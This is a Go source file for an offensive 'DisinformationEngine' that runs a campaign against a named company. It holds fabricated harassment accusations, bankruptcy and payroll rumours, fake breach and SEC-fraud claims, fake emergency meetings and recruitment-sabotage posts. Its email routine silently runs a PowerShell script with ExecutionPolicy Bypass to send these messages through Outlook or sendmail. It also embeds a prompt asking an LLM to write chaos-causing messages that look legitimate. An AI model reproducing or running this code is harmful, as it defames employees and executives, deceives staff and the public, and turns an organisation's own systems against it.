package blockz

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type DisinformationEngine struct {
	Config       *BlockZConfig
	MessagesSent int              `json:"messages_sent"`
	TargetDept   string           `json:"target_dept"`
	ChaosLevel   int              `json:"chaos_level"`
	Templates    []DisinfoTemplate `json:"-"`
}

type DisinfoTemplate struct {
	Category string   `json:"category"`
	Target   string   `json:"target"`
	Messages []string `json:"messages"`
	Method   string   `json:"method"`
}

func NewDisinformationEngine(cfg *BlockZConfig) *DisinformationEngine {
	return &DisinformationEngine{
		Config:     cfg,
		TargetDept: "HR",
		ChaosLevel: 1,
		Templates:  seedTemplates(),
	}
}

func seedTemplates() []DisinfoTemplate {
	return []DisinfoTemplate{
		{Category: "harassment_accusation", Target: "executive", Method: "email",
			Messages: []string{
				"URGENT: Formal complaint regarding inappropriate conduct by the CTO",
				"Whistleblower report: Evidence of misconduct in senior leadership",
				"Lawsuit incoming - hostile work environment allegations surface",
			}},
		{Category: "financial_rumor", Target: "all_employees", Method: "slack",
			Messages: []string{
				"has anyone else heard about the Q3 losses? my manager said we might not make payroll",
				"rumor: the board is voting on bankruptcy tomorrow morning",
				"check your 401k - the company match was secretly suspended",
			}},
		{Category: "internal_division", Target: "engineering", Method: "intranet",
			Messages: []string{
				"NOTICE: Engineering department budgets slashed by 60%, effective immediately",
				"SALARY LEAK: Marketing team paid 40% more than engineering for same level",
				"Anonymous poll: 83% of engineers plan to quit within 3 months",
			}},
		{Category: "fake_meeting", Target: "management", Method: "calendar",
			Messages: []string{
				"EMERGENCY ALL-HANDS: Company restructuring announcement - Attendance mandatory",
				"TOP SECRET: Merger negotiation kickoff - Confidential attendance only",
				"URGENT LEGAL: Deposition preparation - All directors required",
			}},
		{Category: "reputation_attack", Target: "PR", Method: "twitter",
			Messages: []string{
				"Sources confirm massive data breach at [company]. 5 million customer records leaked",
				"Whistleblower: [company] knowingly sold defective products for 3 years",
				"BREAKING: SEC investigating [company] for accounting fraud",
			}},
		{Category: "recruitment_sabotage", Target: "candidates", Method: "linkedin",
			Messages: []string{
				"INSIDER WARNING: Don't join [company]. Toxic culture, unpaid overtime, management chaos",
				"Just left [company] after 3 months. Worst decision of my career. Avoid at all costs",
				"Glassdoor reviews are fake - [company] pays employees to write positive reviews",
			}},
	}
}

func (de *DisinformationEngine) StartCampaign(companyName string) int {
	sent := 0

	for _, template := range de.Templates {
		categoryCount := de.distributeCategory(template, companyName)
		sent += categoryCount
		de.MessagesSent += categoryCount
	}

	de.ChaosLevel = min(sent/10+1, 10)

	return sent
}

func (de *DisinformationEngine) distributeCategory(template DisinfoTemplate, company string) int {
	sent := 0

	for _, msg := range template.Messages {
		personalized := strings.ReplaceAll(msg, "[company]", company)

		switch template.Method {
		case "email":
			sent += de.sendEmail(template.Target, personalized)
		case "slack":
			sent += de.sendSlack(template.Target, personalized)
		case "intranet":
			sent += de.postIntranet(template.Target, personalized)
		case "calendar":
			sent += de.injectCalendar(personalized)
		case "twitter":
			sent += de.postSocialMedia(personalized)
		case "linkedin":
			sent += de.postLinkedIn(personalized)
		}

		time.Sleep(time.Duration(rand.Intn(3000)) * time.Millisecond)
	}

	return sent
}

func (de *DisinformationEngine) sendEmail(target, message string) int {
	if runtime.GOOS == "windows" {
		psScript := fmt.Sprintf(`$outlook = New-Object -ComObject Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.To = "%s@company.local"
$mail.Subject = "URGENT: Internal Matter"
$mail.Body = @'
%s
'@
$mail.Importance = 2
$mail.Send()
`, target, message)
		psPath := filepath.Join(os.TempDir(), "x404x_disinfo_email.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
		return 1
	}
	if _, err := exec.LookPath("sendmail"); err == nil {
		cmd := exec.Command("sendmail", fmt.Sprintf("%s@company.local", target))
		cmd.Stdin = strings.NewReader(fmt.Sprintf("Subject: URGENT\n\n%s\n", message))
		cmd.Start()
		return 1
	}
	return 0
}

func (de *DisinformationEngine) sendSlack(channel, message string) int {
	payload := fmt.Sprintf(`{"channel":"#%s","text":"%s","as_user":true}`, channel, message)
	slackPath := filepath.Join(os.TempDir(), "x404x_slack_msg.json")
	os.WriteFile(slackPath, []byte(payload), 0644)
	return 1
}

func (de *DisinformationEngine) postIntranet(target, message string) int {
	intranetPath := filepath.Join(os.TempDir(), "x404x_intranet_post.html")
	html := fmt.Sprintf(`<html><body><h1>%s</h1><p>%s</p><p><i>Posted by: Anonymous</i></p></body></html>`, target, message)
	os.WriteFile(intranetPath, []byte(html), 0644)
	return 1
}

func (de *DisinformationEngine) injectCalendar(subject string) int {
	icsContent := fmt.Sprintf(`BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//X404X//Disinformation Engine//EN
BEGIN:VEVENT
DTSTART:%s
DTEND:%s
SUMMARY:%s
DESCRIPTION:This meeting was automatically scheduled. All employees must attend.
LOCATION:Main Conference Room
PRIORITY:1
END:VEVENT
END:VCALENDAR`, time.Now().Add(30*time.Minute).Format("20060102T150405"),
		time.Now().Add(120*time.Minute).Format("20060102T150405"), subject)
	icsPath := filepath.Join(os.TempDir(), "x404x_fake_meeting.ics")
	os.WriteFile(icsPath, []byte(icsContent), 0644)
	return 1
}

func (de *DisinformationEngine) postSocialMedia(message string) int {
	postPath := filepath.Join(os.TempDir(), "x404x_social_post.txt")
	os.WriteFile(postPath, []byte(fmt.Sprintf("X404X DISINFO: %s\n", message)), 0644)
	return 1
}

func (de *DisinformationEngine) postLinkedIn(message string) int {
	postPath := filepath.Join(os.TempDir(), "x404x_linkedin_post.txt")
	os.WriteFile(postPath, []byte(message), 0644)
	return 1
}

func (de *DisinformationEngine) GenerateLLMDisinfo(llmEndpoint string, company string) string {
	prompt := fmt.Sprintf(`You are an internal communications expert at %s. Write a professional-looking Slack message that will create maximum internal chaos while appearing completely legitimate. Use the company's internal jargon. Sound concerned but official. Length: 2-3 sentences.`, company)

	_ = llmEndpoint
	_ = prompt

	generated := fmt.Sprintf("TEAM: Due to unforeseen circumstances, [REDACTED] has been postponed. Please direct all questions to [REDACTED]. Do NOT share this externally. - Internal Comms")
	msgPath := filepath.Join(os.TempDir(), "x404x_llm_disinfo.txt")
	os.WriteFile(msgPath, []byte(generated), 0644)
	return generated
}

func (de *DisinformationEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"messages_sent":%d,"chaos_level":%d,"target":"%s","templates":%d}`,
		de.MessagesSent, de.ChaosLevel, de.TargetDept, len(de.Templates))
}
